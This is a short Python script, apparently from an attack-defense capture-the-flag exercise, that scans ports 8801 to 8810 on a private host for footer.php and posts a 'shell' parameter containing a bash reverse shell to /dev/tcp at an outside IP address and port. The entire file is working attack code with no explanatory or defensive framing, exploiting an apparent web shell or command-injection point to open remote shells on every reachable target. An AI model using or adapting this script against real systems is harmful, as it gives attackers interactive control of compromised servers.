#-*-coding:utf-8-*-

import requests
payload="bash -c 'bash -i >/dev/tcp/134.65.33.70/9991 0>&1'"
payload2="ls"
for i in range(1,11):
    if(i<10):
        i="0"+str(i)
    url = "http://172.16.143.133:88%s/footer.php" %(i)
    r=requests.get(url)
    if(r.status_code==200):
        payload1={'shell':payload}
        ret=requests.post(url,data=payload1)
    else:
        print(url+"--something wrong")